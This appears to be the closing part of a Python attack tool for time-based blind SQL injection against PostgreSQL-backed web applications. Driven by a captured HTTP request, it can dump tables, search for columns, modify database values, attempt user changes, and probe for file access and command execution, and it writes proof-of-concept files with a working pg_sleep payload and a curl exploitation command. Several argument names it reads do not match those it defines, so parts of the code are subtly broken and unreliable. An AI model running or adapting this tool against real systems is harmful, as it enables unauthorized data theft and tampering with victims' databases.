        print("[+] User can execute pg_ls_dir function!")
        exec_capabilities['methods_available'].append('pg_ls_dir')
        exec_capabilities['details']['pg_ls_dir'] = "Can use pg_ls_dir for filesystem access"
    else:
        print("[-] User cannot execute pg_ls_dir")
    
    # Check 5: Check if user can create extensions
    print("[*] Checking if user can create extensions...")
    sql_query = f"(CASE WHEN (SELECT usesuper FROM pg_user WHERE usename = current_user) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    is_superuser, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if is_superuser:
        print("[+] User is a superuser and can create extensions!")
        exec_capabilities['methods_available'].append('create_extension')
        exec_capabilities['details']['create_extension'] = "Can create extensions (superuser)"
    else:
        print("[-] User is not a superuser, cannot create extensions")
    
    # Final assessment
    if exec_capabilities['methods_available']:
        exec_capabilities['can_execute_commands'] = True
        print("\n[!] COMMAND EXECUTION CAPABILITY DETECTED!")
        print("[!] This database user appears to have methods available that could")
        print("[!] potentially be used to execute commands on the server.")
        
        for method in exec_capabilities['methods_available']:
            if method == 'procedural_languages':
                langs_str = ', '.join(exec_capabilities['details']['procedural_languages'])
                print(f"    - procedural_languages: Dangerous languages available ({langs_str})")
            else:
                print(f"    - {method}: {exec_capabilities['details'][method]}")
    else:
        print("\n[-] No command execution capabilities detected with current user")
    
    return exec_capabilities

def check_server_info(request_info, verbose=False, resume_file='psql_extraction.resume'):
    """Check basic server information"""
    print("\n[*] Extracting server information...")
    server_info = {}
    
    # Current user
    print("[*] Extracting current PostgreSQL user...")
    current_user = extract_current_user(request_info, verbose)
    server_info['current_user'] = current_user
    
    # Current database
    print("[*] Extracting current database name...")
    current_db = extract_current_database(request_info, verbose)
    server_info['current_database'] = current_db
    
    # PostgreSQL version
    print("[*] Extracting PostgreSQL version...")
    db_version = extract_postgres_version(request_info, verbose)
    server_info['postgresql_version'] = db_version
    
    # Check if user is admin
    print("[*] Checking if current user has admin privileges...")
    is_admin = is_db_admin(request_info)
    server_info['is_admin'] = is_admin
    
    if is_admin:
        print("[+] Current user has admin privileges!")
    else:
        print("[-] Current user does NOT have admin privileges")
    
    # More detailed server info
    print("[*] Extracting detailed server information...")
    server_details = extract_server_information(request_info, verbose)
    server_info.update(server_details)
    
    # File read permissions basic check
    print("[*] Checking basic file read permissions...")
    file_read = check_file_read_permission(request_info)
    server_info['file_read_permission'] = file_read
    
    # Print summary
    print("\n[*] Server Information Summary:")
    print(f"  User: {server_info['current_user']}")
    print(f"  Database: {server_info['current_database']}")
    print(f"  PostgreSQL Version: {server_info.get('postgresql_version', 'Unknown')}")
    print(f"  Admin Privileges: {'Yes' if server_info.get('is_admin', False) else 'No'}")
    print(f"  File Read Permission: {'Yes' if server_info.get('file_read_permission', False) else 'No'}")
    
    if 'os_version' in server_info:
        print(f"  OS Version: {server_info['os_version']}")
    if 'datadir' in server_info:
        print(f"  Data Directory: {server_info['datadir']}")
    
    return server_info

def main():
    # Always display the banner first, before anything else
    display_banner()
    
    # Create a custom argument parser that shows the banner before help
    class BannerArgParser(argparse.ArgumentParser):
        def print_help(self, file=None):
            # Banner is already displayed by main(), just call the parent method
            super().print_help(file)
    
    # Set up argument parser, using our custom class
    parser = BannerArgParser(description='PostgreSQL Time-Based Blind SQL Injection Enumerator')
    
    # Input file arguments
    input_group = parser.add_argument_group('Input Options')
    input_group.add_argument('request_file', help='Request file in cURL format')
    input_group.add_argument('-r', '--resume', dest='resume_file', help='Resume file with extraction state')
    input_group.add_argument('-d', '--delay', type=float, default=2.0, 
                        help='Injection delay in seconds (default: 2.0)')
    input_group.add_argument('-t', '--threads', type=int, default=30,
                        help='Number of threads for parallel extraction (default: 30)')
    input_group.add_argument('--column-threads', type=int, default=5,
                        help='Number of threads for parallel column extraction (default: 5)')
    input_group.add_argument('--retry-limit', type=int, default=3,
                        help='Number of retries for failed requests (default: 3)')
    input_group.add_argument('-f', '--columns-file', dest='columns_file',
                        help='File containing column names (one per line) to use instead of column discovery')
    
    # Server enumeration arguments
    enum_group = parser.add_argument_group('Enumeration Options')
    enum_group.add_argument('-i', '--extract-server-info', action='store_true',
                       help='Extract database server information')
    enum_group.add_argument('--extract-table', metavar='TABLE_INDEX', type=int,
                       help='Extract table name at given index')
    enum_group.add_argument('--extract-column', metavar=('TABLE_NAME', 'COLUMN_INDEX'), nargs=2,
                       help='Extract column name for table at given index')
    enum_group.add_argument('-a', '--extract-all-columns', metavar='TABLE_NAME',
                       help='Extract all columns from the specified table')
    enum_group.add_argument('--extract-value', metavar=('TABLE', 'COLUMN', 'ROW_INDEX'), nargs=3,
                       help='Extract data value from table column at row index')
    enum_group.add_argument('-u', '--dump-table', metavar='TABLE_NAME',
                       help='Dump all data from the specified table')
    enum_group.add_argument('--dump-column', metavar=('TABLE_NAME', 'COLUMN_NAME'), nargs=2,
                       help='Dump data from a specific column')
    enum_group.add_argument('--find-row', metavar=('TABLE', 'COLUMN', 'VALUE'), nargs=3,
                       help='Find row number for a specific value in column')
    enum_group.add_argument('--extract-row', metavar=('TABLE', 'COLUMN', 'VALUE'), nargs=3,
                       help='Extract entire row for a specific value in column')
    enum_group.add_argument('-s', '--search-column', metavar='PATTERN',
                       help='Search for columns matching a pattern')
    enum_group.add_argument('--sample-data', metavar=('TABLE', 'COLUMN'), nargs=2,
                       help='Extract sample data from a column (first 3 rows)')
    
    # Update options
    update_group = parser.add_argument_group('Data Modification Options')
    update_group.add_argument('--update-value', metavar=('TABLE', 'COLUMN', 'SEARCH_COLUMN', 'SEARCH_VALUE', 'NEW_VALUE'), nargs=5,
                       help='Update a value in the database')
    
    # Dump control options
    dump_control = parser.add_argument_group('Dump Control Options')
    dump_control.add_argument('-L', '--dump-limit', type=int, 
                       help='Limit the number of rows to dump')
    dump_control.add_argument('-O', '--dump-offset', type=int, default=0,
                       help='Offset to start dumping from (default: 0)')
    dump_control.add_argument('-D', '--database', default='public',
                       help='Database/schema name (default: public)')
    dump_control.add_argument('-C', '--columns', 
                       help='Comma-separated list of columns to extract (for --dump-table)')
    dump_control.add_argument('--column-by-column', action='store_true',
                       help='Extract data one column at a time (slower but more reliable)')
    
    # User management options
    user_group = parser.add_argument_group('User Management Options')
    user_group.add_argument('--list-users', action='store_true',
                       help='List all database users and their privileges')
    user_group.add_argument('--change-user', metavar='USERNAME',
                       help='Attempt to change to specified database user')
    user_group.add_argument('-P', '--check-permissions', metavar='TABLE_NAME',
                       help='Check current user permissions on table')
    
    # Security check options
    security_group = parser.add_argument_group('Security Checks')
    security_group.add_argument('-W', '--check-file-write', action='store_true',
                       help='Check if database allows writing files to filesystem')
    security_group.add_argument('-R', '--check-file-read', action='store_true',
                       help='Check if database allows reading files from filesystem')
    security_group.add_argument('-E', '--check-command-exec', action='store_true',
                       help='Check if command execution is possible through the database')
    security_group.add_argument('-S', '--server-info', action='store_true',
                       help='Check server information (user, database, version, etc.)')
    security_group.add_argument('-X', '--security-check-all', action='store_true',
                       help='Run all security checks including server info')
    
    # General options
    general_group = parser.add_argument_group('General Options')
    general_group.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    general_group.add_argument('--skip-server-checks', action='store_true',
                       help='Skip initial server checks (deprecated, no longer needed)')
    
    # Add PoC option in the security group
    security_group.add_argument('-p', '--poc', action='store_true',
                       help='Generate a simple PoC output with timestamp and database info')
    
    args = parser.parse_args()
    
    # Set resume file name
    resume_file = args.resume_file if args.resume_file else 'psql_extraction.resume'
    
    # If resuming, load the previous state
    resumed = False
    if args.resume_file:
        resumed = load_progress(args.resume_file)
        if not resumed:
            print("[!] Could not resume from the provided file, starting fresh")
    
    # Parse request file
    request_info = parse_request_file(args.request_file)
    
    # Remove CSRF token refresh attempts on startup
    # (We'll still parse tokens from request files, but won't try to refresh)
    
    # Register signal handlers for clean exit
    try:
        import signal
        def signal_handler(sig, frame):
            print("\n[!] Received interrupt signal, saving progress before exit...")
            save_progress(force=True, resume_file=resume_file)
            print(f"[+] Progress saved to {resume_file}")
            print(f"[+] To resume, run: python {sys.argv[0]} {args.request_file} --resume {resume_file}")
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        print("[+] Auto-save enabled. Press Ctrl+C to save progress and exit at any time")
    except:
        # Might not work on all platforms
        pass
    
    print("Starting PostgreSQL Time-Based Blind SQL Injection Enumerator")
    print("=" * 75)
    print(f"Target URL: {request_info['url']}")
    print(f"Method: {request_info['method']}")
    print(f"Injection pattern identified in request body")
    print(f"Using {MAX_WORKERS} concurrent threads for extraction")
    print(f"Sleep delay: {DELAY} seconds")
    
    if resumed:
        print(f"Resumed from: {args.resume_file}")
        # Override some arguments with resumed values if available
        if resume_data['table_name']:
            args.dump_table = resume_data['table_name']
        if resume_data['database']:
            args.database = resume_data['database']
        if resume_data['limit'] is not None:
            args.dump_limit = resume_data['limit']
        if resume_data['offset'] > 0:
            args.dump_offset = resume_data['offset']
    
    print(f"Schema: {args.database}")
    print(f"Verbose mode: {'On' if args.verbose else 'Off'}")
    print(f"Skip server checks: {'Yes' if args.skip_server_checks else 'No'}")
    # Remove all CSRF token messages here
    
    # Create a results dictionary to store all findings
    results = {}
    
    try:
        # Track if we ran any command
        command_executed = False
        
        # Generate PoC output
        if args.poc:
            command_executed = True
            print("\n🔍 GENERATING PROOF OF CONCEPT")
            print("=" * 75)
            
            poc_data = generate_poc_output(
                request_info,
                args.verbose,
                resume_file
            )
            
            # Save to file
            poc_filename = f"postgresql_sqli_poc_{poc_data['timestamp'].replace(' ', '_').replace(':', '-')}.txt"
            with open(poc_filename, 'w') as f:
                f.write("POSTGRESQL BLIND SQLI - PROOF OF CONCEPT\n")
                f.write("=" * 80 + "\n")
                f.write(f"Timestamp: {poc_data['timestamp']}\n")
                f.write(f"Target URL: {poc_data['url']}\n")
                f.write(f"Vulnerable Parameter: {poc_data['vulnerable_parameter']}\n")
                f.write(f"Working Payload: {poc_data['working_payload']}\n")
                f.write(f"Current Database: {poc_data['database']}\n")
                f.write(f"Current User: {poc_data['user']}\n")
                f.write(f"Database Version: {poc_data['version']}\n")
                f.write(f"Admin Privileges: {'Yes' if poc_data['is_admin'] else 'No'}\n")
                f.write("=" * 80 + "\n")
                
                # Add an example of how to confirm the vulnerability
                f.write("\nTo confirm this vulnerability:\n")
                f.write("1. Send a request with the normal parameter value and measure the response time\n")
                f.write("2. Send a request with the payload and verify that it takes at least 2 seconds longer\n")
                
                # Add a sample curl command if we have all the necessary information
                if poc_data['url'] != 'Unknown' and poc_data['vulnerable_parameter'] != 'Unknown':
                    if 'POST' in request_info.get('request_type', ''):
                        f.write("\nExample exploitation with curl:\n")
                        headers = ' '.join([f'-H "{k}: {v}"' for k, v in request_info.get('headers', {}).items()])
                        body = request_info.get('body', '').replace('SQLI', poc_data['working_payload'])
                        f.write(f"curl -X POST {headers} -d '{body}' {poc_data['url']}\n")
                    else:
                        f.write("\nExample exploitation with curl:\n")
                        url = poc_data['url'].replace('SQLI', poc_data['working_payload'])
                        f.write(f"curl '{url}'\n")
            
            print(f"\n[+] PoC saved to: {poc_filename}")
            return
            
        # Process the columns argument if it exists (added for shortcuts)
        column_list = None
        if hasattr(args, 'columns') and args.columns:
            column_list = [col.strip() for col in args.columns.split(',')]
        
        # Check for file write capabilities
        if args.check_file_write or args.security_check_all:
            command_executed = True
            print("\n🔍 FILE WRITE CAPABILITY CHECK")
            print("=" * 75)
            
            write_capabilities = check_file_write_capabilities(
                request_info,
                args.verbose,
                resume_file
            )
            
            print("\n[*] File Write Capability Summary:")
            print(f"  Can Write Files: {'Yes' if write_capabilities['can_write_files'] else 'No'}")
            if write_capabilities['methods_available']:
                print(f"  Available Methods: {', '.join(write_capabilities['methods_available'])}")
        
        # Check for file read capabilities
        if args.check_file_read or args.security_check_all:
            command_executed = True
            print("\n🔍 FILE READ CAPABILITY CHECK")
            print("=" * 75)
            
            read_capabilities = check_file_read_capabilities(
                request_info,
                args.verbose,
                resume_file
            )
            
            print("\n[*] File Read Capability Summary:")
            print(f"  Can Read Files: {'Yes' if read_capabilities['can_read_files'] else 'No'}")
            if read_capabilities['methods_available']:
                print(f"  Available Methods: {', '.join(read_capabilities['methods_available'])}")
        
        # Check for command execution capabilities
        if args.check_command_exec or args.security_check_all:
            command_executed = True
            print("\n🔍 COMMAND EXECUTION CAPABILITY CHECK")
            print("=" * 75)
            
            exec_capabilities = check_command_execution_capabilities(
                request_info,
                args.verbose,
                resume_file
            )
            
            print("\n[*] Command Execution Capability Summary:")
            print(f"  Can Execute Commands: {'Yes' if exec_capabilities['can_execute_commands'] else 'No'}")
            if exec_capabilities['methods_available']:
                print(f"  Available Methods: {', '.join(exec_capabilities['methods_available'])}")
        
        # Check server information
        if args.server_info or args.security_check_all or args.extract_server_info:
            command_executed = True
            print("\n🔍 SERVER INFORMATION CHECK")
            print("=" * 75)
            
            server_info = check_server_info(
                request_info,
                args.verbose,
                resume_file
            )
        
        # If security checks were performed, complete and exit
        if args.check_file_write or args.check_file_read or args.check_command_exec or args.server_info or args.security_check_all:
            print("\n[+] Security checks completed")
            if args.security_check_all:
                print("[*] Full security assessment summary:")
                if 'can_write_files' in locals() and write_capabilities['can_write_files']:
                    print("⚠️  WARNING: File write capabilities detected!")
                if 'can_read_files' in locals() and read_capabilities['can_read_files']:
                    print("⚠️  WARNING: File read capabilities detected!")
                if 'can_execute_commands' in locals() and exec_capabilities['can_execute_commands']:
                    print("⚠️  WARNING: Command execution capabilities detected!")
                if 'is_admin' in locals() and server_info.get('is_admin', False):
                    print("⚠️  WARNING: User has admin privileges!")
            return
        
        # Check if we're listing database users
        if args.list_users:
            print("\n🔍 DATABASE USER ENUMERATION")
            print("=" * 75)
            
            users = list_database_users(
                request_info,
                args.verbose,
                resume_file
            )
            
            if not users:
                print("[!] Failed to retrieve database users")
            
            return
        
        # Check if we're trying to change the current user
        if args.target_user:
            print("\n🔧 USER CHANGE ATTEMPT")
            print("=" * 75)
            
            success = attempt_user_change(
                request_info,
                args.target_user,
                args.verbose,
                resume_file
            )
            
            if success:
                print(f"[+] Successfully changed to user '{args.target_user}'")
            else:
                print(f"[!] Failed to change to user '{args.target_user}'")
            
            return
            
        # Check if we're checking permissions
        if args.check_permissions:
            print("\n🔍 PERMISSION CHECKING MODE")
            print("=" * 75)
            
            table_name = args.check_table if args.check_table else args.dump_table
            
            has_perms = check_user_permissions(
                request_info,
                table_name,
                args.database,
                args.verbose,
                resume_file
            )
            
            if has_perms:
                print("\n[+] Permission check completed. You have the necessary permissions.")
            else:
                print("\n[+] Permission check completed. Some permissions may be missing.")
                
            return
            
        # Check if we're doing a value update
        if args.update_table and args.update_column and args.update_where_column and args.update_where_value and args.update_value:
            print("\n🔧 DATABASE UPDATE OPERATION")
            print("=" * 75)
            print(f"[*] Preparing to update {args.update_column} in table: '{args.update_table}'")
            
            update_success = update_row_value(
                request_info,
                args.update_table,
                args.update_column,
                args.update_where_column,
                args.update_where_value,
                args.update_value,
                args.database,
                args.verbose,
                resume_file
            )
            
            if update_success:
                print("\n[+] UPDATE OPERATION COMPLETED SUCCESSFULLY!")
                print(f"[+] Updated {args.update_column} to '{args.update_value}' in '{args.update_table}' where {args.update_where_column}='{args.update_where_value}'")
            else:
                print("\n[!] UPDATE OPERATION FAILED")
                print("[!] Check the error messages above for details.")
            
            # Return early after update operation
            return
            
        # If dump-table is specified
        if args.dump_table:
            command_executed = True
            table_name = args.dump_table
            print(f"\n[*] Dumping data from table: {table_name}")
            
            # If columns are specified via -C/--columns flag
            if column_list:
                columns = column_list
                print(f"[*] Using provided columns: {', '.join(columns)}")
            # Otherwise load from columns file if specified
            elif args.columns_file:
                try:
                    with open(args.columns_file, 'r') as f:
                        columns = [line.strip() for line in f if line.strip()]
                    print(f"[*] Loaded {len(columns)} columns from {args.columns_file}")
                except Exception as e:
                    print(f"[!] Error loading columns from file: {e}")
                    print("[*] Falling back to column discovery...")
                    columns = extract_all_columns_parallel(
                        request_info, 
                        args.database, 
                        table_name,
                        args.verbose,
                        True,
                        resume_file,
                        args.column_threads
                    )
            else:
                print("[*] No columns specified. Discovering columns...")
                columns = extract_all_columns_parallel(
                    request_info, 
                    args.database, 
                    table_name,
                    args.verbose,
                    True,
                    resume_file,
                    args.column_threads
                )
            
            if args.column_by_column:
                dump_table_data_by_columns(
                    request_info,
                    table_name,
                    columns,
                    args.database,
                    args.dump_limit,
                    args.dump_offset,
                    args.verbose,
                    resume_file
                )
            else:
                dump_table_data(
                    request_info,
                    table_name,
                    columns,
                    args.database,
                    args.dump_limit,
                    args.dump_offset,
                    args.verbose,
                    resume_file
                )
            return
            
        # If search pattern is provided, prioritize column search
        if args.search_pattern:
            print("\n🔍 COLUMN SEARCH MODE")
            print("=" * 75)
            print(f"[*] Searching for columns matching pattern: '{args.search_pattern}'")
            
            matching_columns = search_column_in_tables(request_info, args.search_pattern, args.database, args.verbose)
            if matching_columns:
                results["matching_columns"] = matching_columns
                print(f"[+] Found {len(matching_columns)} matching columns")
                
                # Extract sample data if requested
                if args.extract_data:
                    print("\n🔍 DATA SAMPLE EXTRACTION")
                    print("=" * 75)
                    for i, (table, column) in enumerate(matching_columns):
                        print(f"\n[*] Extracting samples from table '{table}', column '{column}'...")
                        samples = extract_sample_data(request_info, table, column, args.database, args.limit, args.verbose)
                        
                        if samples:
                            print(f"[+] Data samples from {table}.{column}:")
                            for j, sample in enumerate(samples):
                                print(f"    - Sample {j+1}: {sample}")
                            
                            # Store in results
                            if "data_samples" not in results:
                                results["data_samples"] = {}
                            results["data_samples"][f"{table}.{column}"] = samples
                        else:
                            print(f"[!] No data samples extracted from {table}.{column}")
            
            # Return early if we were just searching
            print("\n📋 SEARCH RESULTS SUMMARY")
            print("=" * 75)
            if matching_columns:
                print(f"Found {len(matching_columns)} columns matching '{args.search_pattern}':")
                for i, (table, column) in enumerate(matching_columns):
                    print(f"  {i+1}. Table: {table}, Column: {column}")
            
            print("\n[+] Search completed successfully!")
            return
        
        # If we get here, do the default user enumeration
        if not args.skip_server_checks:
            print("\n[*] Extracting basic server information...")
            # This is a placeholder for default behavior
            extract_current_user(request_info, args.verbose)
            extract_current_database(request_info, args.verbose)
        
    except Exception as e:
        print(f"\n[!] An error occurred during execution: {e}")
        print("[!] Saving current progress to resume file...")
        save_progress(force=True, resume_file=resume_file)
        print(f"[+] To resume, run: python {sys.argv[0]} {args.request_file} --resume {resume_file}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

def generate_poc_output(request_info, verbose=False, resume_file='psql_extraction.resume'):
    """Generate a simple proof of concept output with timestamp and key database information"""
    # Get current timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print("\n[*] Extracting PoC information...")
    
    # Extract target URL from request_info
    url = request_info.get('url', 'Unknown')
    
    # Extract vulnerable parameter
    vuln_param = "Unknown"
    if 'sqli_pattern' in request_info:
        if request_info.get('request_type') == 'GET':
            # For GET requests
            parts = request_info.get('sqli_pattern', '').split('=')
            if len(parts) > 1:
                vuln_param = parts[0].split('&')[-1]
        else:
            # For POST/JSON requests
            parts = request_info.get('sqli_pattern', '').split('"')
            if len(parts) > 2:
                vuln_param = parts[1]
            elif 'Content-Type' in request_info.get('headers', {}) and 'application/x-www-form-urlencoded' in request_info['headers']['Content-Type']:
                parts = request_info.get('sqli_pattern', '').split('=')
                if len(parts) > 1:
                    vuln_param = parts[0].split('&')[-1]
    
    # Generate a simple working time delay payload
    working_payload = f"';SELECT pg_sleep({DELAY})--"
    
    # Current user
    current_user = extract_current_user(request_info, verbose)
    
    # Current database
    current_db = extract_current_database(request_info, verbose)
    
    # PostgreSQL version
    db_version = extract_postgres_version(request_info, verbose)
    
    # Check if user is admin
    is_admin = is_db_admin(request_info)
    admin_status = "Yes" if is_admin else "No"
    
    # Format and display the PoC output
    print("\n" + "=" * 80)
    print("                  POSTGRESQL BLIND SQLI - PROOF OF CONCEPT                  ")
    print("=" * 80)
    print(f"Timestamp: {timestamp}")
    print(f"Target URL: {url}")
    print(f"Vulnerable Parameter: {vuln_param}")
    print(f"Working Payload: {working_payload}")
    print(f"Current Database: {current_db}")
    print(f"Current User: {current_user}")
    print(f"Database Version: {db_version}")
    print(f"Admin Privileges: {admin_status}")
    print("=" * 80)
    
    # Return as a dictionary for potential further use
    return {
        'timestamp': timestamp,
        'url': url,
        'vulnerable_parameter': vuln_param,
        'working_payload': working_payload,
        'database': current_db,
        'user': current_user,
        'version': db_version,
        'is_admin': is_admin
    }

if __name__ == "__main__":
    # Ensure the banner is displayed even with no arguments
    # The main() function will handle this now
    main()
    
# You might need to remove a duplicate display_banner() call elsewhere in the code
# For example, if it's already being called after argument parsing

